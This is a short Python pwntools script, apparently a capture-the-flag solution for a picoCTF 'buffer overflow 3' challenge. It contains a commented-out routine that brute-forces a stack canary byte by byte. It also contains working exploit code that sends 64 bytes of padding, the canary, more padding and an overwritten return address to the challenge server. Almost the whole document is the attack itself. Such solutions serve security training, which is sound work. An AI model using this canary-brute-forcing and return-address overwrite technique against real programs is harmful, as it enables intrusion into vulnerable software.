# buffer overflow 3 solution

from pwn import *
#context.log_level = "debug" 

dest = p32(134517558)     #0x36930408
canary = b'BiRd'   

'''

def defeat_canary():
    canary = 65
    bits = [1,256,65536,16777216]

    for c_size in range(4): # 0 ~ 3
        msize = str(65 + c_size).encode()
        for runc in range(1,256):
            msg = (b"\x33" * 64) + p32(canary)
            res = delivery(msg, msize)

            if SMASH not in res:
                break
            else:
                canary += bits[c_size]
    
    return canary

x = defeat_canary()
print("========CANARY FOUND========")
print("Canary:", x)
'''


def overflow():
    msg = (b"\x33" * 64) + canary + (b'\x33' * 16) + dest
    flow = delivery(msg, b'3000')

    return flow

    


def delivery(payload,p_size):

    payload += b'\n'

    # Connect to remote app
    s = remote('saturn.picoctf.net', 58138, timeout=5)

    recv = s.recvline()
    s.send(p_size+b'\n')
    recv = s.recvn(7)
    s.send(payload)
    resp = s.recvall()
    s.close()
    return resp




print(overflow())
